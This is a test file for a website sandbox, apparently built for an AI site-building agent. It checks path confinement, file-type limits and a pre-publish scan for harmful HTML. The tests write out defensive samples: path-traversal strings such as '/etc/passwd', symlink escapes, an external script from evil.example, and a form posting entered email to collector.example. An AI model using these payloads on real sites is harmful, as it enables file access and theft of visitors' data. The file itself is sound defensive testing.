/**
 * The website sandbox (server/agent/sandbox.ts): confinement of model-supplied paths, and the
 * scan that protects a site's visitors before it can be published.
 */
import { test, before } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, symlink, writeFile, readFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { SiteSandbox, LIMITS, CSP } from "../server/agent/sandbox.ts";

let base: string;
let outside: string;
before(async () => {
  base = await mkdtemp(path.join(tmpdir(), "pcc-sites-"));
  outside = await mkdtemp(path.join(tmpdir(), "pcc-outside-"));
});
let n = 0;
const site = () => SiteSandbox.open(base, `site-${++n}`);
const codes = async (fn: () => Promise<unknown>) => { try { await fn(); return "ok"; } catch (e: any) { return e.code ?? e.message; } };

test("ordinary files can be written, nested, and read back", async () => {
  const s = await site();
  await s.write("index.html", "<h1>Hi</h1>");
  await s.write("css/site.css", "h1{color:red}");
  assert.equal(await s.read("css/site.css"), "h1{color:red}");
  assert.deepEqual((await s.files()).map((f) => f.path), ["css/site.css", "index.html"]);
});

test("every way out of the site folder is refused", async () => {
  const s = await site();
  for (const p of ["../escape.html", "/etc/passwd", "a/../../escape.html", "%2e%2e/escape.html", "a\\..\\b.html", "x\0.html", "", "a".repeat(201) + ".html"]) {
    assert.equal(await codes(() => s.write(p, "x")), "path", JSON.stringify(p));
  }
});

test("hidden files (.env, .git, .htaccess) are refused", async () => {
  const s = await site();
  for (const p of [".env", ".git/config.json", "assets/.htaccess.txt"]) {
    assert.equal(await codes(() => s.write(p, "x")), "path", p);
  }
});

test("only static-site file types are accepted", async () => {
  const s = await site();
  for (const p of ["shell.php", "run.sh", "app.exe", "server.py", "noextension", "page.html.php"]) {
    assert.equal(await codes(() => s.write(p, "x")), "type", p);
  }
  assert.equal(await codes(() => s.write("logo.svg", "<svg/>")), "ok");
});

test("a symlink planted inside the site cannot redirect a write outside it", async () => {
  const s = await site();
  await s.write("index.html", "x");
  const root = path.join(base, s.siteId);
  await symlink(outside, path.join(root, "linkdir"));
  assert.equal(await codes(() => s.write("linkdir/pwned.html", "x")), "path");
  await assert.rejects(() => readFile(path.join(outside, "pwned.html")), "nothing was written outside");

  await writeFile(path.join(outside, "target.html"), "original");
  await symlink(path.join(outside, "target.html"), path.join(root, "linkfile.html"));
  assert.equal(await codes(() => s.write("linkfile.html", "overwritten")), "path");
  assert.equal(await readFile(path.join(outside, "target.html"), "utf8"), "original");
  assert.equal(await codes(() => s.read("linkfile.html")), "path", "reading through a link is refused too");
});

test("size and count limits hold", async () => {
  const s = await site();
  assert.equal(await codes(() => s.write("big.html", "x".repeat(LIMITS.fileBytes + 1))), "size");
  const t = await site();
  for (let i = 0; i < LIMITS.files; i++) await t.write(`p${i}.txt`, "x");
  assert.equal(await codes(() => t.write("one-more.txt", "x")), "count");
  assert.equal(await codes(() => t.write("p0.txt", "replacing an existing file is fine")), "ok");
});

test("a clean site passes the scan", async () => {
  const s = await site();
  await s.write("index.html", '<html><head><link rel="stylesheet" href="site.css"></head><body><a href="about.html">About</a><script src="app.js"></script></body></html>');
  await s.write("site.css", "body{}");
  await s.write("app.js", "console.log('hi')");
  assert.deepEqual(await s.scan(), []);
});

test("a site needs a home page", async () => {
  const s = await site();
  await s.write("about.html", "<p>about</p>");
  assert.deepEqual((await s.scan()).map((c) => c.id), ["no_index"]);
});

test("each way a page can hurt its visitors is caught", async () => {
  const cases: Array<[string, string, string]> = [
    ['<script src="https://evil.example/x.js"></script>', "external_script", "block"],
    ['<script src="//evil.example/x.js"></script>', "external_script", "block"],
    ['<form action="https://collector.example/submit"><input name="email"></form>', "external_form", "block"],
    ['<input type="password" name="pw">', "password_field", "block"],
    ['<meta http-equiv="refresh" content="0; url=https://elsewhere.example">', "redirect", "block"],
    ['<a href="javascript:alert(1)">x</a>', "javascript_url", "block"],
    ['<iframe src="https://other.example"></iframe>', "external_frame", "warn"],
    ['<img src="https://www.facebook.com/tr?id=1&ev=PageView">', "tracking", "attest"],
  ];
  for (const [html, id, level] of cases) {
    const s = await site();
    await s.write("index.html", `<html><body>${html}</body></html>`);
    const found = (await s.scan()).find((c) => c.id === id);
    assert.equal(found?.level, level, `${id} for ${html}`);
  }
});

test("a form that posts to the site itself is fine", async () => {
  const s = await site();
  await s.write("index.html", '<form action="/thanks.html"><input name="q"></form>');
  assert.deepEqual(await s.scan(), []);
});

test("problems on any page are found, not just the home page", async () => {
  const s = await site();
  await s.write("index.html", "<p>fine</p>");
  await mkdir(path.join(base, s.siteId, "deep"), { recursive: true });
  await s.write("deep/login.html", '<input type="password">');
  assert.ok((await s.scan()).some((c) => c.id === "password_field"));
});

test("published pages carry a content-security policy so the browser enforces the same rules", async () => {
  const s = await site();
  await s.write("index.html", "<html><head><title>x</title></head><body></body></html>");
  await s.write("bare.html", "<p>no head</p>");
  await s.write("site.css", "body{}");
  const bundle = await s.bundle();
  for (const f of bundle.filter((f) => f.path.endsWith(".html"))) {
    assert.ok(f.contents.includes(CSP), f.path);
  }
  assert.equal(bundle.find((f) => f.path === "site.css")?.contents, "body{}", "non-HTML is untouched");
});
